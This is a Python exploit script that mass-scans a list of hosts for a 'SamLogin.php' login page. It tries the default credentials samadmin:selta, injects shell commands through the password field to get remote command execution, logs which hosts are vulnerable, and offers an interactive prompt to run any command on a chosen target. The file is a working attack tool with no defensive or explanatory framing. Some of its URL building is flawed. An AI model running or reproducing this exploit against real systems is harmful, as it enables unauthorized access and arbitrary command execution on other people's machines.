import os, sys
from host import host
import requests, requests.exceptions
import re
from exploit.samipExploit import *

class SamipExploit:
    def samipBruteForce(self):
        params = {'lang': 'it', 'username': 'samadmin', 'MultiDOminio': '0', 'password': 'selta', 'submit': 'LOGIN'}
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/up_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                if address['port'] == 443 or address['port'] == 8888:
                    url = "https://" + address['ip'] + ":" + "/php/SamLogin.php"
                else:
                    url = "http://" + address['ip'] + ":" + str(address['port'])+ "/php/SamLogin.php"
                try:
                    r = requests.post(url, data=params, verify=False)
                    if 'Pannello' in r.text or 'sessione' in r.text:
                        print("[-] Found http://" + address['ip'] + ":" + str(address['port']) + " with credentials samadmin:selta")
                except:
                    pass
            except:
                pass
            a += 1
    def samipRCEexploit(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/up_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                if address['port'] == 443 or address['port'] == 8888:
                    url = "https://" + address['ip'] + ":" + "/php/"
                else:
                    url = "http://" + address['ip'] + ":" + str(address['port'])
                rce = """selta|||a #' |id && whoami||a #|" '"""
                params = {'lang': 'it', 'username': 'samadmin', 'MultiDOminio': '0', 'password': rce, 'submit': 'LOGIN'}
                vulnLink = url + "/php/SamLogin.php"
                try:
                    upload = requests.post(vulnLink, data=params)
                    if 'gid' in upload.text:
                        print('[!] Found user: ' + upload.text + ' on '+ url)
                        with open(path + '/host/vuln_host.txt', 'a') as host_vuln:
                            host_vuln.write(address['ip']+ ':' + str(address['port']) + "\n")
                except:
                    a += 1
            except:
                a += 1
            a += 1
    def lista(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/vuln_host.txt', 'r').read().splitlines()
        cont = 1
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                if address['port'] == 443 or address['port'] == 8888:
                    url = "https://" + address['ip'] + ":" + "/php/"
                else:
                    url = "http://" + address['ip'] + ":" + str(address['port'])
                print("["+ str(cont) + "]" + " "+ url)
                cont += 1
                a += 1
            except:
                a += 1
    def samipSingleExploit(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/vuln_host.txt', 'r').read().splitlines()
        SamipExploit.lista(self)
        selection = input("[?] Please select a target from the list above: ")
        command = input("[?] Now tell me the command to execute: ")
        rce = """selta|||a #' |"""+ command + """||a #|" '"""
        params = {'lang': 'it', 'username': 'samadmin', 'MultiDOminio': '0', 'password': rce, 'submit': 'LOGIN'}
        address = host.Host.addressRegex(vulnerable_host[int(selection)])
        if address['port'] == 443 or address['port'] == 8888:
            urlSelected = "https://" + address['ip'] + ":" + "/php/"
        else:
            urlSelected = "http://" + address['ip'] + ":" + str(address['port'])
        vulnLink = urlSelected + "/php/SamLogin.php"
        try:
            upload = requests.post(vulnLink, data=params)
            print(upload.text)
        except:
            pass




